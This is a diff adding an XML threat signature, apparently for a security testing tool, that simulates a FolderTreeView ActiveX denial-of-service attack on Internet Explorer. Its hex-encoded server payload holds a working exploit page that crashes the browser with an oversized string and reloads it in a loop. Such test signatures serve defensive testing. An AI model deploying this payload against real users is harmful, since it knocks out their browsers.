@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="FolderTreeView ActiveX Control Remote Denial of Service Vulnerability"/>
+    <EngDesc display="true" value="This threat use a maliciously crafted html page to trigger a denial of service condition due to the vulnerable ActiveX &quot;FolderTreeView&quot; Control in Internet Explorer. This affects the FolderTreeView ActiveX Control using Internet Explorer Web Browser clients that typically connect to the http port 80."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Common_Controls_Replacement_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Common_Controls_Replacement_Project_FolderTreeview_Control"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Common_Controls_Replacement_Project_FolderTreeview_Control_1.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3142"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="22092"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="b9aca603de70ddf6cabad15e12995427"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633047032835937500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1169187260" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="E"/>
+      <for index="D"/>
+      <for index="C"/>
+      <for index="F"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E31203230302F4F4B0D0A5365727665723A20556E61626F6D6265722F312E300D0A436F6E74656E742D747970653A20746578742F786D6C0D0A0D0A3C212D2D0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D0D0A4343525020466F6C64657220547265657669657720436F6E74726F6C202863637270667476362E6F63782920496E7465726E6574204578706C6F7265722044656E69616C206F6620536572766963650D0A617574686F723A207368696E6E61690D0A6D61696C3A207368696E6E61695B61745D6175746973746963695B646F745D6F72670D0A736974653A20687474703A2F2F7368696E6E61692E616C74657276697374612E6F72670D0A546573746564206F6E2057696E646F77732058502050726F66657373696F6E616C2053503220616C6C20706174636865642C207769746820496E7465726E6574204578706C6F72657220370D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D0D0A2D2D3E0D0A0D0A3C68746D6C3E0D0A3C6F626A65637420636C61737369643D27636C7369643A31394237463244362D313631302D313144332D424633302D314146383230353234313533272069643D274343525027203E3C2F6F626A6563743E0D0A3C736372697074206C616E67756167653D277662736372697074273E0D0A0D0A617267436F756E74203D20310D0A0D0A617267313D537472696E6728323030303030302C20224122290D0A0D0A434352502E526F6F74466F6C646572203D20617267310D0A0D0A3C2F7363726970743E0D0A0D0A3C736372697074206C616E67756167653D276A617661736372697074273E0D0A20646F63756D656E742E6C6F636174696F6E2E72656C6F616428290D0A3C2F7363726970743E" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
